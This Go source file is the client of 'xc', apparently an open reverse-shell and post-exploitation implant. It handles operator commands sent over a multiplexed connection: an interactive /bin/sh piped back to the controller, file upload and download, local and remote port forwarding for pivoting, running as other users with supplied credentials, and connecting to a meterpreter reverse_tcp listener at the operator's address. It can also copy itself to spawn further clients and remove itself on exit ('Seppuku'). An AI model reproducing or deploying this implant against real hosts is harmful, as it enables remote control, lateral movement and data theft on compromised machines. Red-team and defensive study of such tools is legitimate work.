package client

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"
	
	"../meter"
	"../plugins"
	"../shell"
	"../utils"
	"github.com/hashicorp/yamux"
)

var activeForwards []utils.Forward
var shellQuit chan bool
var shellCmd *exec.Cmd
var shellPipeReader *io.PipeReader
var shellPipeWriter *io.PipeWriter

// print usage that is shared between os clients
func usage() string {
	usage := "Usage:\n"
	usage += "└ Shared Commands:"
	usage += "  !exit\n"
	usage += "  !upload <src> <dst>\n"
	usage += "   * uploads a file to the target\n"
	usage += "  !download <src> <dst>\n"
	usage += "   * downloads a file from the target\n"
	usage += "  !lfwd <localport> <remoteaddr> <remoteport>\n"
	usage += "   * local portforwarding (like ssh -L)\n"
	usage += "  !rfwd <remoteport> <localaddr> <localport>\n"
	usage += "   * remote portforwarding (like ssh -R)\n"
	usage += "  !lsfwd\n"
	usage += "   * lists active forwards\n"
	usage += "  !rmfwd <index>\n"
	usage += "   * removes forward by index\n"
	usage += "  !plugins\n"
	usage += "   * lists available plugins\n"
	usage += "  !plugin <plugin>\n"
	usage += "   * execute a plugin\n"
	usage += "  !spawn <port>\n"
	usage += "   * spawns another client on the specified port\n"
	usage += "  !shell\n"
	usage += "   * runs /bin/sh\n"
	usage += "  !runas <username> <password> <domain>\n"
	usage += "   * restart xc with the specified user\n"
	usage += "  !met <port>\n"
	usage += "   * connects to a x64/meterpreter/reverse_tcp listener\n"
	usage += "  !restart\n"
	usage += "   * restarts the xc client\n"
	usage += "└ OS Specific Commands:"
	return usage
}

func handleSharedCommand(s *yamux.Session, c net.Conn, argv []string, usage string, homedir string) bool {
	handled := false
	switch argv[0] {
	case "!help":
		handled = true
		c.Write([]byte(usage))
		prompt(c)
	case "!runas":
		handled = true
		if len(argv) != 4 {
			c.Write([]byte("Usage: !runas <username> <password> <domain>\n"))
		} else {
			shell.RunAs(argv[1], argv[2], argv[3], c)
		}
		prompt(c)
	case "!met":
		handled = true
		if len(argv) > 1 {
			port := argv[1]
			ip := strings.Split(c.RemoteAddr().String(), ":")[0]
			ok, err := meter.Connect(ip, port)
			if !ok {
				c.Write([]byte(err.Error() + "\n"))
			}
		} else {
			c.Write([]byte("Usage: met <port>\n"))
		}
		prompt(c)
	case "!upload":
		handled = true
		if len(argv) == 3 {
			dst := argv[2]
			// from the clients perspective we are downloading a file
			utils.UploadConnect(dst, s)
			c.Write([]byte("[+] Upload complete\n"))
		} else {
			c.Write([]byte("Usage: !upload <src> <dst>\n"))
		}
		prompt(c)
	case "!download":
		handled = true
		if len(argv) == 3 {
			src := argv[1]
			utils.DownloadConnect(src, s)
			c.Write([]byte("[+] Download complete\n"))
		} else {
			c.Write([]byte("Usage: !download <src> <dst>\n"))
		}
		prompt(c)
	case "!lfwd":
		handled = true
		if len(argv) == 4 {
			lport := argv[1]
			raddr := argv[2]
			rport := argv[3]
			fwd := utils.Forward{lport, rport, raddr, make(chan bool), true, true}
			portAvailable := true
			for _, item := range activeForwards {
				if item.LPort == lport {
					portAvailable = false
					break
				}
			}
			if portAvailable {
				go lfwd(fwd, s, c)
				activeForwards = append(activeForwards, fwd)
			}
		} else {
			c.Write([]byte("Usage: !lfwd <localport> <remoteaddr> <remoteport> (opens local port)\n"))
		}
		prompt(c)
	case "!rfwd":
		handled = true
		if len(argv) == 4 {
			lport := argv[1]
			raddr := argv[2]
			rport := argv[3]
			fwd := utils.Forward{lport, rport, raddr, make(chan bool), false, true}

			portAvailable := true
			for _, item := range activeForwards {
				if item.LPort == lport {
					portAvailable = false
					break
				}
			}
			if portAvailable {
				go rfwd(fwd, s, c)
				activeForwards = append(activeForwards, fwd)
			} else {
				c.Write([]byte(fmt.Sprintf("Remote Port %s already in use.\n", lport)))
			}
		}
		prompt(c)
	case "!lsfwd":
		handled = true
		c.Write([]byte("Active Port Forwarding:\n"))
		index := 0
		remoteAddr := c.RemoteAddr().String()
		remoteAddr = remoteAddr[:strings.LastIndex(remoteAddr, ":")]
		localAddr := c.LocalAddr().String()
		localAddr = localAddr[:strings.LastIndex(localAddr, ":")]
		for _, v := range activeForwards {
			if v.Local {
				c.Write([]byte(fmt.Sprintf("[%d] Listening on %s:%s, Traffic redirect to %s (%s:%s)\n", index, remoteAddr, v.LPort, localAddr, v.Addr, v.RPort)))
			} else {
				c.Write([]byte(fmt.Sprintf("[%d] Listening on %s:%s, Traffic redirect to %s (%s:%s)\n", index, localAddr, v.LPort, remoteAddr, v.Addr, v.RPort)))
			}

			index++
		}
		prompt(c)
	case "!rmfwd":
		handled = true
		if len(argv) == 2 {
			index, _ := strconv.Atoi(argv[1])
			// remove index and stop forward
			forward := activeForwards[index]
			forward.Quit <- true
			activeForwards = append(activeForwards[:index], activeForwards[index+1:]...)
		} else {
			c.Write([]byte("Usage: !rmfwd <index>\n"))
		}
		prompt(c)
	case "!shell":
		handled = true
		//log.Println("Entering shell")
		shellCmd = shell.Shell()
		shellPipeReader, shellPipeWriter = io.Pipe()
		shellCmd.Stdin = c
		shellCmd.Stdout = shellPipeWriter
		shellCmd.Stderr = shellPipeWriter
		go io.Copy(c, shellPipeReader)
		shellCmd.Start()
		shellCmd.Wait()
		//log.Println("Quitting shell (exit)")
		prompt(c)
	case "!plugins":
		handled = true
		out := ""
		for _, s := range plugins.List() {
			out += s
			out += ", "
		}
		if len(out) > 0 {
			out = out[:len(out)-2] + "\n"
			c.Write([]byte(out))
		}
		prompt(c)
	case "!plugin":
		handled = true
		if len(argv) == 2 {
			pluginName := argv[1]
			plugins.Execute(pluginName, c)
		} else {
			c.Write([]byte("Usage: !plugin <name>\n"))
		}
		prompt(c)
	case "!spawn":
		handled = true
		if len(argv) == 2 {
			port := argv[1]
			path := shell.CopySelf()
			ip, _ := utils.SplitAddress(c.RemoteAddr().String())
			cmd := fmt.Sprintf("%s %s %s\r\n", path, ip, port)
			go shell.ExecSilent(cmd, c)
		} else {
			c.Write([]byte("Usage: !spawn <port>\n"))
		}
		prompt(c)
	case "!exit":
		handled = true
		log.Println("Bye!")
		shell.Seppuku(c)
		os.Exit(0)
	case "cd":
		handled = true
		if len(argv) == 2 {
			dir := strings.ReplaceAll(argv[1], "~", homedir)
			err := os.Chdir(dir)
			if err != nil {
				c.Write([]byte("Unable to change dir: " + err.Error() + "\n"))
			}
		} else {
			c.Write([]byte("Usage: cd <directory>\n"))
		}
		prompt(c)
	case "!sigint":
		handled = true
		shellQuit <- true
	case "!debug":
		handled = true
		fmt.Printf("Active Goroutines: %d\n", runtime.NumGoroutine())
	case "!restart":
		handled = true
		ip, port := utils.SplitAddress(c.RemoteAddr().String())
		cmd := fmt.Sprintf("%s %s %s\r\n", os.Args[0], ip, port)
		go shell.ExecSilent(cmd, c)		
		time.Sleep(1 * time.Second)
		c.Close()
		os.Exit(0)
	}
	return handled
}

// splitArgs
func splitArgs(cmd string) []string {
	args := []string{}
	current := ""
	squote := 0
	dquote := 0
	last := ""
	for _, rune := range cmd {
		char := string(rune)
		if char == "'" && last != "\\" {
			squote++
			if squote == 2 {
				squote = 0
			}
		} else if char == "\"" && last != "\\" {
			dquote++
			if dquote == 2 {
				dquote = 0
			}
		} else if char == " " && squote == 0 && dquote == 0 && last != "\\" {
			args = append(args, current)
			current = ""
		} else {
			if char != "\\" || (last == "\\" && char == "\\") {
				current += char
			}
			last = char
		}
	}
	if len(args) == 0 {
		args = append(args, cmd)
	} else {
		args = append(args, current)
	}
	return args
}

func prompt(c net.Conn) {
	cwd, err := os.Getwd()
	if err != nil {
		cwd = "?"
	}
	fmt.Fprintf(c, fmt.Sprintf("[xc: %s]: ", cwd))
}

func lfwd(fwd utils.Forward, s *yamux.Session, c net.Conn) {
	go func() {
		for {
			proxy, err := s.Accept()
			if err != nil {
				//log.Println(err)
				return
			}
			fwdCon, err := net.Dial("tcp", fmt.Sprintf("%s:%s", fwd.Addr, fwd.RPort))
			if err != nil {
				//log.Println(err)
				return
			}
			defer fwdCon.Close()
			go utils.CopyIO(fwdCon, proxy)
			go utils.CopyIO(proxy, fwdCon)
			if !fwd.Active {
				return
			}
		}
	}()
	for {
		select {
		case <-fwd.Quit:
			fwd.Active = false
			return
		}
	}
}

// opens the listening socket on the client (remote) side
func rfwd(fwd utils.Forward, session *yamux.Session, c net.Conn) {
	ln, err := net.Listen("tcp", fmt.Sprintf(":%s", fwd.LPort))
	if err != nil {
		log.Println(err)
		return
	}
	go func() {
		for {
			// allow lots of connections on a port forward
			fwdCon, err := ln.Accept()
			if err == nil && fwdCon != nil {
				defer fwdCon.Close()
				if err != nil {
					log.Println(err)
				}
				proxy, err := session.Open()
				if err != nil {
					log.Println(err)
				}
				go utils.CopyIO(fwdCon, proxy)
				go utils.CopyIO(proxy, fwdCon)
			}
			if !fwd.Active {
				return
			}
		}
	}()
	// Block until exit signal (this is called as goroutine so its fine)
	for {
		select {
		case <-fwd.Quit:
			// force close the worker routine by closing the listener && preventing another accept
			fwd.Active = false
			ln.Close()
			return
		}
	}
}
